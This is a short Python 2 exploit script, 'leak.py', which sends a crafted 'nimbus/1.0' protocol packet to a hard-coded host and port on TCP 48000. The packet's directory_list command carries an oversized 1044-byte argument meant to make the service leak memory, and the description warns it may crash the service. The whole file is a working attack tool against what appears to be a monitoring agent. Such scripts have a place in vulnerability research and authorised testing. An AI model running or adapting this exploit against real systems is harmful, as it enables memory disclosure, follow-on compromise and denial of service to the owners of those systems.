#!/usr/bin/env python2
#
# Program name    : leak.py
# Version         : 1.0
# Author          : wetw0rk
# Python version  : 2.7
#
# Description:
#   This demonstrates how we can trigger a leak using the same bug. There is
#   a chance of triggering a DoS...
#

import socket, struct

HOST = "192.168.88.157"
PORT = 48000

def gen_probe(buff):
  packet_header = "nimbus/1.0 {:d} {:d}\r\n"
  packet_body = (
  "\x6d\x74\x79\x70\x65\x00\x37\x00\x34\x00\x31\x30\x30\x00\x63"
  "\x6d\x64\x00\x37\x00\x31\x35\x00\x64\x69\x72\x65\x63\x74\x6f"
  "\x72\x79\x5f\x6c\x69\x73\x74\x00\x73\x65\x71\x00\x31\x00\x32"
  "\x00\x30\x00\x74\x73\x00\x31\x00\x31\x31\x00\x31\x35\x32\x32"
  "\x37\x31\x33\x36\x30\x30\x00\x66\x72\x6d\x00\x37\x00\x31\x35"
  "\x00\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x2f\x31\x33\x33\x37"
  "\x00\x74\x6f\x75\x74\x00\x31\x00\x34\x00\x31\x38\x30\x00\x61"
  "\x64\x64\x72\x00\x37\x00\x30"
  )
  packet_args  = "directory\x00"
  packet_args += "7\x00{:d}\x00".format(len(buff)+1)
  packet_args += "{:s}\x00".format(buff)
  
  packet_header = packet_header.format(
    len(packet_body),
    len(packet_args)
  )

  probe = packet_header + packet_body + packet_args

  return probe

payload = "A" * 1044

print("[*] payload size: %d" % len(payload))
packet = gen_probe(payload)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(packet)
r = sock.recv(4096)
print repr(r)
